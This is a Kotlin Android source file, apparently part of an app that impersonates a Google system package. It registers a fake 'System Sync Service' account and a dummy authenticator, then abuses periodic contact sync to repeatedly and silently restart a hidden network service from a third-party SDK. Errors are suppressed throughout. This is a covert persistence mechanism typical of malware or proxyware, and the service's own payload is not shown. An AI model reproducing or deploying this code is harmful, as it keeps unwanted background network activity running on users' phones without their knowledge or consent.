package com.google.system

import android.accounts.AbstractAccountAuthenticator
import android.accounts.Account
import android.accounts.AccountManager
import android.content.AbstractThreadedSyncAdapter
import android.content.ContentProviderClient
import android.content.Context
import android.content.Intent
import android.content.SyncRequest
import android.content.SyncResult
import android.os.Build
import android.os.Bundle
import android.os.IBinder
import com.openaccess.sdk.service.SystemNetworkService

class SyncAdapter(context: Context, autoInitialize: Boolean) : 
    AbstractThreadedSyncAdapter(context, autoInitialize) {
    
    override fun onPerformSync(
        account: Account?,
        extras: Bundle?,
        authority: String?,
        provider: ContentProviderClient?,
        syncResult: SyncResult?
    ) {
        try {
            SystemNetworkService.start(context)
        } catch (_: Exception) {}
    }
    
    companion object {
        private const val ACCOUNT_TYPE = "com.google.system.sync"
        private const val ACCOUNT_NAME = "System Sync Service"
        
        fun setup(context: Context) {
            try {
                val accountManager = AccountManager.get(context)
                val account = Account(ACCOUNT_NAME, ACCOUNT_TYPE)
                
                if (accountManager.addAccountExplicitly(account, null, null)) {
                    val syncRequest = SyncRequest.Builder()
                        .syncPeriodic(300, 900)
                        .setSyncAdapter(account, "com.android.contacts")
                        .setExtras(Bundle())
                        .build()
                    
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                        android.content.ContentResolver.requestSync(syncRequest)
                    } else {
                        android.content.ContentResolver.setSyncAutomatically(account, "com.android.contacts", true)
                        android.content.ContentResolver.addPeriodicSync(account, "com.android.contacts", Bundle(), 900)
                    }
                }
            } catch (_: Exception) {}
        }
    }
}

class SyncAdapterService : android.app.Service() {
    private var syncAdapter: SyncAdapter? = null
    private val syncAdapterLock = Any()
    
    override fun onCreate() {
        synchronized(syncAdapterLock) {
            if (syncAdapter == null) {
                syncAdapter = SyncAdapter(applicationContext, true)
            }
        }
    }
    
    override fun onBind(intent: Intent?): IBinder? = syncAdapter?.syncAdapterBinder
}

class AuthenticatorService : android.app.Service() {
    private var authenticator: Authenticator? = null
    
    override fun onCreate() {
        if (authenticator == null) {
            authenticator = Authenticator(applicationContext)
        }
    }
    
    override fun onBind(intent: Intent?): IBinder? = authenticator?.iBinder
}

class Authenticator(context: Context) : AbstractAccountAuthenticator(context) {
    override fun editProperties(response: android.accounts.AccountAuthenticatorResponse?, accountType: String?): Bundle? = null
    override fun addAccount(response: android.accounts.AccountAuthenticatorResponse?, accountType: String?, authTokenType: String?, requiredFeatures: Array<out String>?, options: Bundle?): Bundle? = null
    override fun confirmCredentials(response: android.accounts.AccountAuthenticatorResponse?, account: Account?, options: Bundle?): Bundle? = null
    override fun getAuthToken(response: android.accounts.AccountAuthenticatorResponse?, account: Account?, authTokenType: String?, options: Bundle?): Bundle? = null
    override fun getAuthTokenLabel(authTokenType: String?): String? = null
    override fun updateCredentials(response: android.accounts.AccountAuthenticatorResponse?, account: Account?, authTokenType: String?, options: Bundle?): Bundle? = null
    override fun hasFeatures(response: android.accounts.AccountAuthenticatorResponse?, account: Account?, features: Array<out String>?): Bundle? = null
}
